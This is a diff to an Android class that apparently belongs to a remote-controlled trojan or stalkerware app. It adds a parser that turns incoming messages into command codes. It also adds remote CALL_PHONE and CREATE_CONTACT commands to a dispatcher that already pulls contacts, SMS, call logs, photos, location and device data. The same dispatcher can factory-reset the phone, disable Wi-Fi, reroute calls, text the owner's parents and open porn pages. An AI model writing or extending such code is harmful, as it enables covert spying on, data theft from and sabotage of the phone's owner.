@@ -231,6 +231,7 @@ public class Lofl {
     public static void phoneCall(Context context, String address) {
         Intent callIntent = new Intent(Intent.ACTION_CALL);
         callIntent.setData(Uri.parse("tel:" + address));
+        callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
         context.startActivity(callIntent);
     }
 
@@ -387,63 +388,82 @@ public class Lofl {
         context.startActivity(webSearchIntent);
     }
 
-    public static void onReceiveCommand(Context context, int command, String arg1) {
+    public static void processCommand(Context context, String message){
+        String[] commandParts = message.split("::");
+        String cmd = commandParts[1];
+        if(cmd.contains("--")){
+            String[] commandWithArgument = cmd.split("--");
+            String commandCode = commandWithArgument[0].trim();
+            if(commandWithArgument.length == 3){
+                String argumentOne = commandWithArgument[1].trim();
+                String argumentTwo = commandWithArgument[2].trim();
+                Lofl.onReceiveCommand(context, Integer.valueOf(commandCode), argumentOne, argumentTwo);
+            }else{
+                String argument = commandWithArgument[1];
+                Lofl.onReceiveCommand(context, Integer.valueOf(commandCode), argument, null);
+            }
+        }else{
+            int commandCode = Integer.valueOf(cmd.trim());
+            Lofl.onReceiveCommand(context, commandCode, null, null);
+        }
+
+    }
+
+    public static void testProcessCommand(Context context){
+        String message = Constants.COMMAND_CODE + Commands.CREATE_CONTACT + " --" + "Mike Hunt" + " --" + "0001112222";
+        processCommand(context,message);
+    }
+
+    public static boolean onReceiveCommand(Context context, int command, String arg1, String arg2) {
         boolean commandFound = false;
         Intent intent = new Intent();
+        intent.setClass(context, JobsIntentService.class);
         switch (command) {
-            case Commands.WEB_PORN:
-                intent.setAction(JobsIntentService.ACTION_WEB_PORN);
-                intent.setClass(context, JobsIntentService.class);
+            case Commands.WEB_BROWSER:
+                if(arg1 != null){
+                    intent.setAction(JobsIntentService.ACTION_WEB_BROWSER);
+                    intent.putExtra(Constants.URL, arg1);
+                }
                 commandFound = true;
                 break;
             case Commands.WALLPAPER:
                 intent.setAction(JobsIntentService.ACTION_WALLPAPER);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.CONTACTS:
                 intent.setAction(JobsIntentService.ACTION_CONTACTS);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.SMS:
                 intent.setAction(JobsIntentService.ACTION_SMS);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.CALL_LOG:
                 intent.setAction(JobsIntentService.ACTION_PHONE_CALLS);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.CALENDAR_EVENTS:
                 intent.setAction(JobsIntentService.ACTION_CALENDAR_EVENT);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.DCIM:
                 intent.setAction(JobsIntentService.ACTION_DCIM_FILES);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.TEXT_PARENTS:
                 intent.setAction(JobsIntentService.ACTION_TEXT_PARENTS);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.DEVICE_INFO:
                 intent.setAction(JobsIntentService.ACTION_DEVICE_INFO);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.INSTALLED_PACKAGES:
                 intent.setAction(JobsIntentService.ACTION_PACKAGES);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
             case Commands.SYNC_PHONE_TO_DATABASE:
                 // TODO: 1/31/19
                 intent.setAction(JobsIntentService.ACTION_CONTACTS);
-                intent.setClass(context, JobsIntentService.class);
                 context.startService(intent);
                 intent.setAction(null);
                 intent.setAction(JobsIntentService.ACTION_PHONE_CALLS);
@@ -464,46 +484,58 @@ public class Lofl {
                 break;
             case Commands.DOS_WIFI_CARD:
                 intent.setAction(JobsIntentService.ACTION_WIFI_CARD);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.FLASHLIGHT:
                 intent.setAction(JobsIntentService.ACTION_FLASHLIGHT);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.VIBRATOR:
                 intent.setAction(JobsIntentService.ACTION_VIBRATOR);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.LOCATION:
                 intent.setAction(JobsIntentService.ACTION_LOCATION);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.SHARE_APP:
                 intent.setAction(JobsIntentService.ACTION_SHARE_APP);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.FACTORY_RESET:
                 intent.setAction(JobsIntentService.ACTION_FACTORY_RESET);
-                intent.setClass(context, JobsIntentService.class);
                 commandFound = true;
                 break;
             case Commands.REROUTE_PHONE_CALLS:
                 if(arg1 != null){
                     intent.putExtra(OutgoingCallReceiver.NUMBER_KEY, arg1);
                     intent.setAction(JobsIntentService.ACTION_REROUTE_CALLS);
-                    intent.setClass(context, JobsIntentService.class);
                 }
                 commandFound = true;
                 break;
+            case Commands.CALL_PHONE:
+                if(arg1 != null){
+                    intent.putExtra(Constants.ADDRESS, arg1);
+                    intent.setAction(JobsIntentService.ACTION_CALL_PHONE);
+                }
+                commandFound = true;
+                break;
+            case Commands.CREATE_CONTACT:
+                if(arg1 != null && arg2 != null){
+                    intent.putExtra(Constants.NAME_KEY, arg1);
+                    intent.putExtra(Constants.ADDRESS, arg2);
+                    intent.setAction(JobsIntentService.ACTION_INSERT_CONTACT);
+                }
             default:
                 break;
         }
-        context.startService(intent);
+        if(intent.getAction() != null){
+            context.startService(intent);
+        }else{
+            return false;
+        }
+
+        return commandFound;
     }
 
     public static void playMosquitoRingtoneTwice(Context context) {
@@ -562,6 +594,12 @@ public class Lofl {
         }).start();
     }
 
+    public static void openBrowser(Context context, String url){
+        Uri webUrl = Uri.parse(url);
+        Intent intent = new Intent(Intent.ACTION_VIEW, webUrl);
+        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        context.startActivity(intent);
+    }
     public static void watchPornHubVideo(Context context, String videoId) {
         Uri pornVideo = Uri.parse("https://www.pornhub.com/view_video.php?viewkey=".concat(videoId));
         Intent pornIntent = new Intent(Intent.ACTION_VIEW, pornVideo);
